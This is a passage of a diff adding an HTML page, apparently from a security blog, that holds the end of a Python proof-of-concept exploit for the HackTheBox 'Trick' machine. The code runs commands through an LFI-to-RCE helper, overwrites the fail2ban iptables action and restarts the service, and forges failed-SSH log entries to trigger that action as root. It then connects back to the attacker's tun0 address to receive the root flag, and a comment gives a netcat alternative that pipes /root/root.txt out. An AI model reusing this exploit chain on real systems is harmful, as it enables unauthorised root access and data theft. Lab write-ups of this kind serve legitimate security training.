+    <span class="n">lfi_rce_marketing</span><span class="p">(</span><span class="s2">&quot;&quot;&quot;cp -f /tmp/im.conf.tmp /etc/fail2ban/action.d/iptables-multiport.conf&quot;&quot;&quot;</span><span class="p">)</span>
+    <span class="n">lfi_rce_marketing</span><span class="p">(</span><span class="s2">&quot;&quot;&quot;sudo /etc/init.d/fail2ban restart&quot;&quot;&quot;</span><span class="p">)</span>
+    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>
+    <span class="c1"># ALTERNATIV: cat /root/root.txt | nc -Nlvp 4444</span>
+    <span class="c1"># client: nc -d 127.0.0.1 4444</span>
+    <span class="n">logger_chain</span> <span class="o">=</span> <span class="s1">&#39;logger --tag sshd --id=1337 -p auth.info &quot;Failed password for invalid user root from 192.192.192.192 port 31337 ssh2&quot;;sleep 2;&#39;</span> <span class="o">*</span> <span class="mi">12</span>
+    <span class="n">lfi_rce_marketing</span><span class="p">(</span><span class="n">logger_chain</span><span class="p">)</span>
+    <span class="c1"># for i in range(15):</span>
+    <span class="c1">#     lfi_rce_marketing(f&quot;&quot;&quot;logger --tag sshd --id={1337+i} -p auth.info &#39;Failed password for invalid user root from 192.192.192.192 port {31337+i} ssh2&#39;&quot;&quot;&quot;)</span>
+    <span class="c1">#     time.sleep(1)</span>
+    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
+    <span class="k">with</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span> <span class="k">as</span> <span class="n">s</span><span class="p">:</span>
+        <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">tip</span><span class="p">,</span> <span class="mi">35345</span><span class="p">))</span>
+        <span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+    <span class="n">root_flag</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+    <span class="k">return</span> <span class="n">root_flag</span>
+
+
+<span class="k">def</span> <span class="nf">get_ip_address</span><span class="p">(</span><span class="n">ifname</span><span class="p">):</span>
+    <span class="sd">&quot;&quot;&quot;</span>
+
+<span class="sd">    Args:</span>
+<span class="sd">      ifname (str): Name of the network interface</span>
+
+<span class="sd">    Returns:</span>
+<span class="sd">        str: The IP of the given network interface</span>
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_DGRAM</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">socket</span><span class="o">.</span><span class="n">inet_ntoa</span><span class="p">(</span><span class="n">fcntl</span><span class="o">.</span><span class="n">ioctl</span><span class="p">(</span>
+        <span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span>
+        <span class="mh">0x8915</span><span class="p">,</span>  <span class="c1"># SIOCGIFADDR</span>
+        <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;256s&#39;</span><span class="p">,</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">ifname</span><span class="p">[:</span><span class="mi">15</span><span class="p">],</span> <span class="s1">&#39;utf-8&#39;</span><span class="p">))</span>
+    <span class="p">)[</span><span class="mi">20</span><span class="p">:</span><span class="mi">24</span><span class="p">])</span>
+
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+    <span class="sd">&quot;&quot;&quot;The main function to start the PoC&quot;&quot;&quot;</span>
+    <span class="c1"># Enable DEBUG logging if you want see the executed steps</span>
+    <span class="c1"># logger.setLevel(logging.DEBUG)</span>
+    <span class="n">logger</span><span class="o">.</span><span class="n">setLevel</span><span class="p">(</span><span class="n">logging</span><span class="o">.</span><span class="n">INFO</span><span class="p">)</span>
+    <span class="n">logger</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;Initializing PoC&quot;</span><span class="p">)</span>
+    <span class="n">logger</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;Getting the root flag takes around 30 seconds, be patient&quot;</span><span class="p">)</span>
+    <span class="n">sql_injection_str2file</span><span class="p">(</span><span class="n">test</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+    <span class="n">sql_injection_str2file</span><span class="p">()</span>
+    <span class="n">lfi_rce_marketing</span><span class="p">(</span><span class="n">test</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+    <span class="n">lip</span> <span class="o">=</span> <span class="n">get_ip_address</span><span class="p">(</span><span class="s2">&quot;tun0&quot;</span><span class="p">)</span>
+    <span class="n">logger</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;user flag: </span><span class="si">{}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">user_flag</span><span class="p">()))</span>
+    <span class="n">logger</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;root flag: </span><span class="si">{}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">root_flag</span><span class="p">(</span><span class="n">lip</span><span class="p">,</span> <span class="s2">&quot;preprod-payroll.trick.htb&quot;</span><span class="p">)))</span>
+
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
+    <span class="n">main</span><span class="p">()</span>
+</code></pre></div>
+  </div>
+  <div class="tag-cloud">
+    <p>
+    </p>
+  </div>
+
+
+
+
+
+</article>
+
+    <footer>
+<p>&copy; 2022 </p>
+<p>
+Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a href="http://bit.ly/flex-pelican" target="_blank">Flex</a> theme
+  <span class="footer-separator">|</span>
+  Switch to the <a href="javascript:void(0)" onclick="theme.switch(`dark`)">dark</a> | <a href="javascript:void(0)" onclick="theme.switch(`light`)">light</a> | <a href="javascript:void(0)" onclick="theme.switch(`browser`)">browser</a> theme
+  <script id="dark-theme-script"
+          src="/theme/dark-theme/dark-theme.min.js"
+          data-enable-auto-detect-theme="False"
+          data-default-theme="light"
+          type="text/javascript">
+  </script>
+</p>    </footer>
+  </main>
+
+
+
+
+<script type="application/ld+json">
+{
+  "@context" : "http://schema.org",
+  "@type" : "Blog",
+  "name": " Security Blog ",
+  "url" : "",
+  "image": "/images/profile.jpg",
+  "description": ""
+}
+</script>
+
+</body>
+</html>
